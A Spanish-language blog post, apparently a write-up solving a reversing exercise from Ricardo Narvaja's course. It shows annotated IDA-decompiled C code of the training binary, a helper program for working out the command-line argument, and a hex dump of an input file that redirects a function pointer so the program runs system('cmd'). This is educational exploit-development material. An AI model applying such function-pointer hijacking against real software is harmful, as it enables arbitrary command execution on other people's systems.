---
title: "Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow)"
date: 2024-08-26T15:52:16-03:00
tags: ['reversing','ricardo','narvaja','examen','ida']
---

No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás `wine EXAMEN_10.exe 49` el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.

El código que me generó el ida con algunas modificaciones
```c

_DWORD *__thiscall this_106(_DWORD *this)
{
  this[106] = "A ejecutar la calculadora de nuevo...\n";
  return this;
}

int __cdecl check2(char *Destination)
{
  strcat(Destination, *(Destination + 106));
  //  Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena "A ejecutar la calculadora de nuevo...\n" y ahora tenemos que hacer que Destination tenga 18. 18+38=56.
  // Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0.

  // Voy a ejecutar cmd porque wine no tiene calc.exe
  if ( strlen(Destination) == 56 )
  {
    if ( Destination[4] == 'I' )
      (*(Destination + 52))(Destination + 254);
    if ( Destination[4] == 'P' )
      (*(Destination + 53))(Destination + 254);
    if ( Destination[4] == 'Q' )
      // Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30]

      // Esto es lo mismo que system(Buffer[30])
      (*(Destination + 54))(Destination + 254);

    if ( Destination[4] == 'R' )
      (*(Destination + 55))(Destination + 254);
  }
  return 0;
}

int __cdecl check(char *Destination, int a2)
{
  // Acá le resta '1' al puntero a system, vamos a ver que significa 1 en hexa.
  // 1 en hexadecimal = 31
  // Entonces tenemos que hacer que v12 valga 49, no sé bien por qué 
  // system+49-'1' = system
  Destination[54] = a2 - '1';
  check2(Destination);
  return 0;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char Destination[204]; // [esp+0h] [ebp-1B4h] BYREF
  FILE *Stream; // [esp+CCh] [ebp-E8h]
  int (*imprimir)(const char *const, ...); // [esp+D0h] [ebp-E4h]
  int (*v7)(const char *const, ...); // [esp+D4h] [ebp-E0h]
  int (*v8)(const char *const, ...); // [esp+D8h] [ebp-DCh]
  int (*v9)(const char *const, ...); // [esp+DCh] [ebp-D8h]
  char Buffer[200]; // [esp+E0h] [ebp-D4h] BYREF
  const char *v11; // [esp+1A8h] [ebp-Ch]
  int v12; // [esp+1ACh] [ebp-8h]
  int v13; // [esp+1B0h] [ebp-4h]

  this_106(Destination);
  imprimir = printf;
  v7 = printf;
  v8 = printf;
  v9 = printf;
  printf(v11);
  v13 = printf;
  memset(Buffer, 0, sizeof(Buffer));
  memset(Destination, 0, 200u);
  // Carga el contenido del archivo en Stream
  Stream = fopen("example.txt", "rb");
  if ( !Stream )
  {
    imprimir("No se puede leer el archivo bye bye \n");
    exit(1);
  }
  // De stream copia 200 bytes a Buffer
  fread(Buffer, 200u, 1u, Stream);
  // De buffer lo copia a Destination
  strcpy(Destination, Buffer);
  // Si hay un argumentos
  if ( argc == 2 )
  {
    // Transforma a entero el 2do argumento
    // v12 tiene que valer 31 entonces.
    v12 = atoi(argv[1]);
    // Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system.
    // v13 = system + 49
    v13 = system + v12;
  }
  check(Destination, v13);
  imprimir("\n");
  // Buffer[30] = Destination[254]
  imprimir(&Buffer[30]);
  return 0;
}
```
### Con este código me dí cuenta que tenía que pasarle 49 como argumento:
```c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){

	// a = 61
	// 1 = 31
	printf("atoi(%s): %d\n",argv[1],atoi(argv[1]));

	printf ("argc: %d\n",argc);
	char a = 'a' - '1' + atoi(argv[1]);

	printf("a = 61, 1 = 31\n");
	printf("'%c'-'1'+atoi(%s): %x\n",'a',argv[1],a);
	return 0;
}
```

#### Exploit
```
00000000: 5151 5151 5151 5151 5151 5151 5151 5151  QQQQQQQQQQQQQQQQ
00000010: 5100 5151 5151 5151 5151 5151 5151 636d  Q.QQQQQQQQQQQQcm
00000020: 64                                       d
```
Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta '1' en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.
